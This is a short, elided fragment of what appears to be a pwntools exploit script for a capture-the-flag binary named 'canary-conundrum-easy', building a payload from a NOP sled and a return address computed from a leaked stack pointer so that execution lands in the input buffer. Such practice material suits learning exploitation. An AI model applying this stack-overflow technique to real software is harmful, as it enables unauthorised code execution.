...
p = process("./canary-conundrum-easy")
...
payload += b"\x90" * 8
payload += p64(leaked_stack - 0x1110 - 0x80) # leaked_stack - leaked_stack_offset_to_current_rbp - from_rbp_to_our_input_buffer
